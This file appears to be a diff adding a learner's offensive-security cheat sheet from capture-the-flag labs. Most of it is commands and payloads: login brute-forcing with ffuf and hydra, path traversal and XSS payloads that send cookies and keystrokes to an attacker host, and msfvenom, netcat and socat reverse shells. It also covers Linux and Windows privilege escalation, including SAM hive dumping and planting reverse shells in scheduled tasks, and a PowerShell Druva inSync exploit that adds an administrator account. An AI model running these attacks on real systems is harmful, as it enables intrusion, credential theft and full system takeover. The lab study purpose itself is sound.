@@ -1,0 +1,497 @@
+find hidden page:
+    gobuster -u http://fakebank.com -w wordlist.txt dir
+review a web application:
+    right click + show source code => to know the framwork used ,hiden link, the versions ect to find if there are vulnerabilties
+    inspecter element => you can see some hidden data by modifying some elements
+    /robot.txt => file used by search engine for help to find sub directories in allow and not allow
+    favicon => smal icon displayed in browser if it is in default we can know the framwork by hashing the images and 
+                compare in     https://wiki.owasp.org/index.php/OWASP_favicon_database
+                 curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+    /sitemap.xml =>  list of every file the website owner wishes to be listed on a search engine
+    http header : These headers can sometimes contain useful information such as the webserver software 
+                                            and possibly the programming/scripting language in use.
+        
+    OSINT:
+        google hacking: site: ,inurl: ,filetype: ,intitle:
+        https://www.wappalyzer.com/ :  what technologies a website uses, such as frameworks, Content Management Systems 
+                                     (CMS), payment processors and much more, and it can even find version numbers as well.
+        https://archive.org/web/ :  historical archive of websites
+        http(s)://{name}.s3.amazonaws.com  : you can find information
+    automated discovery :
+        dirb
+        gobuster
+        ffuf
+    subdomain discovery : used for discover more potential points of vulnerability
+        crt.sh / https://ui.ctsearch.entrust.com/ui/ctsearchui => used for find subdomain
+        OSINT : -site:www.tryhackme.com  site:*.tryhackme.com
+        dnsrecon
+        sublist3r
+        virtual hosts : Some subdomains aren't always hosted in publically accessible DNS results
+    authentication bypass: 
+        use the erreur message "username already exist" to find username
+            ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d              
+                            "username=FUZZ&email=x&password=x&cpassword=x" 
+                     -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.91.17/customers/signup -mr 
+                                                 "username already exists"
+        search for passwords:
+            ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list
+                      -top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded"
+                                -u http://10.10.91.17/customers/login -fc 200
+        cookie : you can intercept and modify cookie to play as a user or escelate privellage
+IDOR: when you can show data not for you , we can apply change of the id in url .
+File inclusion : attacker can use file inclusion vulnerabilities to read sensitive data
+                 ex:http://webapp.thm/get.php?file=userCV.pdf
+    Path Traversal:  allows an attacker to read operating system resources,
+        http://webapp.thm/get.php?file={../../../../etc/passwd => here modify}
+    LFI:
+        1-http://webapp.thm/index.php?lang={EN.php => here modify}
+        2-lab3.php?file=../../../../etc/passwd%00 
+        curl -d "file=../../../etc/flag3%00" -X POST http://10.10.129.44/challenges/chall3.php --output file.txt
+    RFI: when we can inject external ur
+        http://10.10.85.161/playground.php?file=http://10.18.13.99:8899/hello.php
+    SSRF: accessing data of serveur or api by modifying
+        https://website.thm/item/2?server=server.website.thm/flag?id=9&x=
+        you can use x/../private 
+    XSS:where malicious JavaScript gets injected into a web application with the intention of being executed by other users
+        <script>alert('XSS');</script> => alert
+        <script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script> => Session Stealing
+        <script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script> => keyloger
+    Commande injection: when you can inject cmd or shell commande
+        && whoami
+    SQLI:
+        https://website.thm/blog?id=2;-- => ; the end ,-- comment
+        ' " to detect sqli
+Burp suit: used for attacking web and mobile application
+    proxy => do pause for request you can modify it then take the response in website
+    repeater => send request multiple time or attempt when we try to inject
+    intruder => for bruteforce
+        sniper => one playlist , the first constant the second change and the contrary
+        batterring ram => one wordlist ,all variable with the same payload
+        pitchfork => the first of wordlist 1 with the first of wordlist 2
+        cluster bomb => many word list , check all combainaison
+    decoder => for decode encode hash
+    comparer => for compar two text
+    sequencer => to analyse sequence of cokies or ect and how generated
+passive reconaissance :
+    whois tryhackme.com => various information
+    nslookup -type=a tryhackme.com 1.1.1.1 => for dns information
+    dig @SERVER DOMAIN_NAME TYPE
+    https://dnsdumpster.com/
+Active reconaissance:
+    Web browser : https://127.0.0.1:8834/ test ports / and showing source code
+    ping : ICMP request for check connectivity between two 
+        ping ip
+    traceroute: to know the routers and hops between the attacker and target
+        traceroute ip
+    telnet: excute commande line in clear text .
+        telnet ip port
+    nc :
+        nc ip port
+    nmap :
+        enumerating targets :
+            nmap -sL -n 10.10.10.10/29
+        host discovery using ARP: if you are in the same network using wlan or ethernet
+            sudo nmap -PR -sn 10.10.210.6/24 //-sn if you don’t want to follow that with a port scan.
+            sudo arp-scan -I eth0 -l
+        host discovery using ICMP:
+             sudo nmap -PE -sn 10.10.68.220/24 => normal ICMP
+             sudo nmap -PP -sn 10.10.68.220/24 => ICMP with timestamp we used if normal ICMP are blocked
+             sudo nmap -PM -sn 10.10.68.220/24 => uses address mask queries
+        host discovery using TCP/UDP:
+            syn ping:
+                sudo nmap -PS -sn 10.10.68.220/24 => use port 80 if you dont specify port (-PS77)
+            ack ping:
+                sudo nmap -PA -sn 10.10.68.220/24 => use port 80
+            udp ping:
+                sudo nmap -PU -sn 10.10.68.220/24 => use any port ,if we take a unreachable paquet response => the host exist
+        port scaning:
+             
+            TCP 4 way handshake: SYN, SYN/ACK, ACK, ACK/RST
+                nmap -sT 10.10.70.178 => scan first 1000 port.
+            TCP 3 way handSHake: SYN,SYN/ACK,RST : => decrease risque of looged
+                sudo nmap -sS 10.10.70.178
+            UDP scan :
+                sudo nmap -sU 10.10.70.178
+            Null scan : all flag are 0
+                sudo nmap -sN 10.10.100.235
+            FIN scan : FIN flag is 1
+                sudo nmap -sF 10.10.100.235
+            Xmas scan: FIN, PSH, and URG 
+                sudo nmap -sX 10.10.100.235
+            Maimon scan : FIN/ACK
+                sudo nmap -sM 10.10.252.27
+            ACK scan: to bypass firewall
+                sudo nmap -sA 10.10.100.235
+            Window scan:
+                sudo nmap -sW 10.10.100.235
+            Custom Scan : you specify the flag
+                sudo nmap --scanflags {flags} 10.10.100.235
+            spoofing :
+                ip:
+                    -S spofed_ip
+                mac:
+                    --spoof-mac SPOOFED_MAC
+                multiple ip spoof:
+                    nmap -D 10.10.0.1,10.10.0.2,RND,RND,ME 10.10.100.235
+            fragmentation: to fragment the paquet to multiple paquets
+                -f
+            zombie:
+                nmap -sI ZOMBIE_IP 10.10.100.235
+            getting more details:
+                --reason
+                -v 
+                -vv
+                -d
+                -dd
+      service detection :
+         sudo nmap -sV 10.10.131.123 => you can add --version-intensity LEVEL
+      OS detection : -O => add it
+            sudo nmap -sS -O 10.10.131.123
+      traceroute:
+           sudo nmap -sS --traceroute 10.10.131.123
+      nmap scripting engine: /usr/share/nmap/scripts
+            by default:
+                -sC or --script=default
+            specify :
+                sudo nmap -sS -n --script "http-date" 10.10.131.123
+      saving the outpout :
+        -oN filename
+        -oG filename
+        -oX filename
+        -oS filename
+protocols and servers:
+    telnet: 23
+        telnet 10.10.171.16
+    http: 80
+        telnet 10.10.171.16 81
+    ftp : 21
+        ftp 10.10.171.16 
+    SMTP :25
+         telnet 10.10.171.16 25
+    pop3: used to downlaod emails from email delivry agent  110
+         telnet 10.10.171.16 110
+    IMAP : like pop3 but high level
+        
+sniffing attack:
+    sudo tcpdump port 110 -A
+    wireshark
+    Tshark
+MITM:
+    ettercap
+    bettercap
+SSL/TLS:
+    used to encrypt connection
+ssh: like telnet but secure 22
+    ssh username@10.10.83.199
+    scp document.txt mark@10.10.90.253:/home/mark => copy file using ssh
+password attack:
+    hydra:
+        hydra -l penny -P /home/mrbnf/Downloads/MetasploitWordlist.txt smb://10.10.203.42 server service or{service://server:port}
+    
+    
+vulnerabilities:
+    databases:
+        https://nvd.nist.gov/vuln/full-listing
+        https://www.exploit-db.com/
+    automated scanners:
+        nessus
+    manual scanners:
+        https://www.rapid7.com/db/
+        github
+        searchsploit
+Metasploit:
+    msfconsole
+    shell commande
+    history
+    use ///module_name
+    show options
+    set PARAMETER_NAME VALUE
+    set PARAMETER_NAME VALUE => will set for all modules
+    unset all
+    exploit 
+    run
+    exploit -z => background session
+    check => check if the target vulnerable
+    background
+    sessions 
+    show payloads/auxilary/...
+    info 
+    search module_name
+    
+msfvenom: to generate payloads :
+    msfvenom --list payloads
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.25.229 LPORT=5678 -f elf > rev_shell_linux_5678.elf
+multi handler:
+    msfconsole
+    use multi/handler
+    set PAYLOAD <payload>
+    set LHOST <listen-address>
+    set LPORT <listen-port>
+    exploit -j
+
+transfert file :
+    python3 -m http.server 9000 => via http lien
+    wget lien/filename
+
+reverse :
+    target send remote accss to shell
+        On the attacking machine:
+
+            sudo nc -lvnp 443
+
+        On the target:
+
+            nc 10.8.25.229 1234 -e /bin/bash => linux
+            nc -lvnp <port> -e "cmd.exe" => windows
+bind:
+    open port in target then we can send commande line to excute
+        On the target:
+
+            nc -lvnp <port> -e "cmd.exe"
+
+        On the attacking machine:
+
+            nc MACHINE_IP <port>
+-l is used to tell netcat that this will be a listener
+-v is used to request a verbose output
+-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
+-p indicates that the port specification will follow.
+
+move to interactive:
+1-using python:
+    python -c 'import pty;pty.spawn("/bin/bash")'
+    export TERM=xterm
+    ctrl + z
+    stty raw -echo; fg
+2-rlwrap:
+    rlwrap nc -lvnp <port>
+
+3-socat: similar to netcut but with more options like encrypted shell
+reverse :
+    target send remote accss to shell
+        On the attacking machine:
+
+           socat TCP-L:<port> -
+
+
+
+        On the target:
+
+            socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" => linux
+            socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes => windows
+bind:
+    open port in target then we can send commande line to excute
+        On the target:
+
+            socat TCP-L:<PORT> EXEC:"bash -li" => linux
+            socat TCP-L:<PORT> EXEC:powershell.exe,pipes => windows
+
+        On the attacking machine:
+
+            socat TCP:<TARGET-IP>:<TARGET-PORT> -
+
+encypted shell using socat:
+    1-generate certificate:
+        openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+        cat shell.key shell.crt > shell.pem
+     
+    reverse: 
+        attacker:
+            socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+        target:
+            socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+    bind:
+        attacker:
+            socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+        target:
+            socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
+
+
+linux privellage escalation:
+    enumeration:
+        hostname => the name of host
+        uname -a => information about OS
+        /proc/version => information about the target system processes. 
+        /etc/issue => system information
+        ps -A / ps axjf / ps aux => View all running processes
+        env => environment variable
+        sudo -l => all commande can be run as sudo
+        ls
+        id username => information about user
+        cat /etc/passwd =>  discover users on the system.
+        history
+        ifconfig
+        ip route
+        netstat -a / netstat -tp => looking into existing communications.tcp / udp
+        find /home -name flag1.txt => find in home directory
+        find / -type d -name config
+        find / -type f -perm 0777
+        find / -perm a=x: find executable files
+        find /home -user frank: find all files for user “frank” under “/home”
+        find / -mtime 10: find files that were modified in the last 10 days
+        find / -atime 10: find files that were accessed in the last 10 day
+        find / -cmin -60: find files changed within the last hour (60 minutes)
+        find / -amin -60: find files accesses within the last hour (60 minutes)
+        find / -size (+/-)50M: find files with a 50 MB size
+         “-type f 2>/dev/null” to redirect errors to “/dev/null”
+        find / -writable -type d 2>/dev/null : Find world-writeable folders
+        find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
+        find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
+        find / -perm -o x -type d 2>/dev/null : Find world-executable folders
+        find / -name perl*
+        find / -name python*
+        find / -name gcc*
+   methods:
+        1-kernal exploits:
+            enemurate kernal and OS and searching if exist exploit.
+                hostname
+                uname -a
+                /proc/version
+        2-sudo:
+            sudo -l => to show allowed commande as root
+            use function or parametre allowed from this commande to privellage escalation. ex {sudo find . -exec /bin/sh \; -quit}
+                we open /bin/sh using commande find allowed as root
+        3-SUID:
+            find / -type f -perm -04000 -ls 2>/dev/null => show programmes that has s in the permission rwsrwxrwx
+                then used to read file like /etc/shadow or /etc/passwd then crack password using john(https://www.youtube.com/watch?v=X1Yl_StL1ac
+               )
+        4-Capabilities:
+            getcap -r / 2>/dev/null => give  binary or programmes can be used through its capabilities.
+            then excute it to escilate privelage (open shell,read files) {./vim -c ':py3 import os; os.setuid(0);os.execl("/bin/sh","sh","-c","reset; exec sh")'}
+        5-Cron jobs: Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user.
+            cat /etc/crontab => to show jobs will be run every minute hours ...
+            then modify job to open reverse shell with root privellage
+            bash -i >& /dev/tcp/10.8.25.229/1234 0>&1 
+            
+        6-PATH:
+            the idea is to excute script (thm) by add it in one directory from path (or modify path) from a script with root privellage like SUID./// gooooooooooooooooood
+        7-NFS: use folder/script shared from attacker as root privellage to excuted in target as root with SUID 
+            cat /etc/exports => show if no_root_squash is present
+            
+            
+Windows privellage escilation:
+    sc qc WindowsScheduler => information about service
+    icacls C:\PROGRA~2\SYSTEM~1\WService.exe => permition of the user
+
+    Windows Users: 
+        Administrators
+        Standard Users
+            SYSTEM / LocalSystem > Administrator
+     1-Unattended Windows Installations : show files 
+                C:\Unattend.xml
+                C:\Windows\Panther\Unattend.xml
+                C:\Windows\Panther\Unattend\Unattend.xml
+                C:\Windows\system32\sysprep.inf
+                C:\Windows\system32\sysprep\sysprep.xml
+     2-Powershell History:
+            type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+     3-Saved Windows Credentials:
+            cmdkey /list
+            runas /savecred /user:admin cmd.exe
+     4-IIS Configuration :
+            C:\inetpub\wwwroot\web.config
+            C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+     5-Retrieve Credentials from Software: PuTTY
+        reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
+        
+     6-Scheduled Tasks:
+            schtasks /query /tn vulntask /fo list /v => to show the tass
+            icacls c:\tasks\schtask.bat
+c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
+                    BUILTIN\Administrators:(I)(F)
+                    BUILTIN\Users:(I)(F)) => to modify the permission
+            echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat => to modify code of tasks to open reverse shell
+            C:\> schtasks /run /tn vulntask=> to start task
+     7-AlwaysInstallElevated: configure app to run with high level privellage:
+            reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
+            reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+            msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
+            C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
+        
+        
+     8-Windows Services:
+        sc qc apphostsvc => information about service
+        icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) => modify permission
+         replace service with the payload (msfvenom -p payload/windows/x64/meterpreter_reverse_tcp  LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe)
+         sc stop windowsscheduler
+         sc start windowsscheduler
+         
+     
+     
+     9-Unquoted Service Paths: when there are not "":
+            sc qc apphostsvc => information about service
+            create payload 
+            move payload to path.
+            icacls C:\MyPrograms\Disk.exe /grant Everyone:F => modify permission of payload.
+       
+            sc stop "disk sorter enterprise"
+            sc start "disk sorter enterprise"
+     10-Insecure Service Permissions : 
+            accesschk64.exe -qlc thmservice => search for SERVICE_ALL_ACCESS
+            create payload
+            transfert to path like :C:\Users\thm-unpriv\rev-svc3.exe
+            icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F => modify permission
+             sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem =>To change the service's associated executable and account
+             sc stop THMService
+             sc start THMService
+            
+            
+     11-SeBackup / SeRestore :copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash
+                whoami /priv => to show privellage
+                reg save hklm\system C:\Users\THMBackup\system.hive
+                reg save hklm\sam C:\Users\THMBackup\sam.hive => To backup the SAM and SYSTEM hashes
+                then copy to attacker machine and apply Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges
+                
+     12-SeTakeOwnership:
+            whoami /priv => show SeTakeOwnership if exist
+            search for programme run with SYSTEM privileges
+            replace it with payload 
+            takeown /f C:\Windows\System32\Utilman.exe => take ownership
+             icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F => modify permission
+             copy cmd.exe utilman.exe => modify it
+      13 - SeImpersonate / SeAssignPrimaryToken:
+            whoami /priv => show if exist
+            c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
+      14 - Unpatched Software:
+            wmic product get name,version,vendor
+            
+            
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd2 SimplePass123 /add & net localgroup administrators pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+
+
+        find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+        
+        
+hydra -l admin -P /usr/share/wordlists/ 10.10.254.62 http-post-form
+
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.254.62 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=xFEfqR5%2FOOj%2BxpMB66aZKfUIIHNx9UH0ssc%2BOsno8FrS5zxo8F2FdQ2CbnDnlBVqvG7TNEFmir9ixqhvICPG5pI8IlMYtDggENahkIwMDOnZvSV9fbzHzZpqH9uy4j6wB5%2FzxlJ5PGDGUw2bGjYWiODOTcnRNehL74OgUe%2BXKCN4P3LH&__EVENTVALIDATION=QIXSUYR%2FV%2BWv3afc3T7e3F3NM5GkD%2BeTfAk2neeQoODpO1bPBDZ6%2FlhJAC5zM9jVioCSLDAtGkN6tmtIny0E4oG3CGvHpU41zCyRIU0utkUHltz1MubYunSyzL1XL%2FaXUQOHrOrnXI8ar1ddsY65GF9vF3%2BOVTo6kQy9El9zPh5oTOH%2B&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+
+powershell -c "Invoke-WebRequest -Uri 'http://10.8.25.229:9000/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"
+        
